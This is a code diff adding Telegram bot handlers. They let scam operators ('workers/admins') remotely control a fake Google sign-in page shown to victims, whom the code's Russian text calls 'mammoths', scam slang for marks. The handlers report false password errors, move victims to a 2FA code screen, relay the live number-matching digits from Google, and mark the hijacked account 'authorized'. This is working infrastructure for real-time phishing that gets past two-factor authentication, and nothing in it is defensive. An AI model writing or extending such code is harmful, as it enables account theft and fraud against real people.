@@ -2588,3 +2588,113 @@ async def cb_adm_reset_sessions(callback: CallbackQuery, bot: Bot) -> None:
 async def cb_noop(callback: CallbackQuery) -> None:
     await callback.answer()
 
+
+PENDING_GOOGLE_PROMPT: dict[int, int] = {}
+
+
+@router.callback_query(F.data.startswith("gctrl:"))
+async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
+    parts = callback.data.split(":")
+    if len(parts) < 3:
+        await callback.answer("Ошибка формата кнопки", show_alert=True)
+        return
+
+    action = parts[1]
+    try:
+        target_tg_id = int(parts[2])
+    except ValueError:
+        await callback.answer("Неверный ID мамонта", show_alert=True)
+        return
+
+    if action == "wrong_pass":
+        db.set_google_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="error_password",
+            error_msg="Неверный пароль. Повторите попытку.",
+        )
+        await callback.answer("❌ Мамонту отправлена ошибка 'Неверный пароль'", show_alert=True)
+        await notify_user_event(
+            event_type="google_password",
+            user_tg_id=target_tg_id,
+            details="Воркер/Админ отклонил пароль (Неверный пароль)",
+            is_test=True,
+        )
+
+    elif action == "ask_prompt":
+        PENDING_GOOGLE_PROMPT[callback.from_user.id] = target_tg_id
+        await callback.answer("📲 Введите 2 цифры в чат...", show_alert=False)
+        if callback.message:
+            await callback.message.answer(
+                f"🔢 <b>Google Auth (ID <code>{target_tg_id}</code>)</b>\n\n"
+                "Введите <b>2 цифры</b> с экрана Google (например <code>42</code>) прямо в ответ на это сообщение:",
+                parse_mode="HTML",
+            )
+
+    elif action == "ask_2fa":
+        db.set_google_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="show_2fa",
+        )
+        await callback.answer("🔑 Экран переведен на ввод 2FA кода", show_alert=True)
+        await notify_user_event(
+            event_type="google_2fa_waiting",
+            user_tg_id=target_tg_id,
+            details="Воркер/Админ перевел мамонта на 2FA код",
+            is_test=True,
+        )
+
+    elif action == "wrong_2fa":
+        db.set_google_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="error_2fa",
+            error_msg="Неверный код. Проверьте код и повторите попытку.",
+        )
+        await callback.answer("❌ Мамонту отправлена ошибка 2FA кода", show_alert=True)
+
+    elif action == "complete":
+        db.set_google_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="completed",
+        )
+        db.set_user_auth_step(DB_PATH, target_tg_id, "authorized")
+        await callback.answer("🎉 Авторизация Google подтверждена!", show_alert=True)
+        await notify_user_event(
+            event_type="google_complete",
+            user_tg_id=target_tg_id,
+            auth_step="authorized",
+            details="Воркер/Админ подтвердил успешный вход Google",
+            is_test=True,
+        )
+
+
+@router.message(F.text)
+async def handle_admin_prompt_digits(message: Message, bot: Bot):
+    if message.from_user is None or message.text is None:
+        return
+
+    if message.from_user.id in PENDING_GOOGLE_PROMPT:
+        target_tg_id = PENDING_GOOGLE_PROMPT.pop(message.from_user.id)
+        digits = message.text.strip()
+        db.set_google_auth_control(
+            DB_PATH,
+            tg_id=target_tg_id,
+            status="show_prompt",
+            prompt_number=digits,
+        )
+        await message.answer(
+            f"✅ <b>Цифры {digits} отправлены мамонту!</b>\n"
+            f"Экран устройства мамонта (ID <code>{target_tg_id}</code>) переключен на подтверждение цифры <b>{digits}</b>.",
+            parse_mode="HTML",
+        )
+        await notify_user_event(
+            event_type="google_prompt",
+            user_tg_id=target_tg_id,
+            details=f"Выведено число {digits} на экран мамонта",
+            is_test=True,
+        )
+        return
+
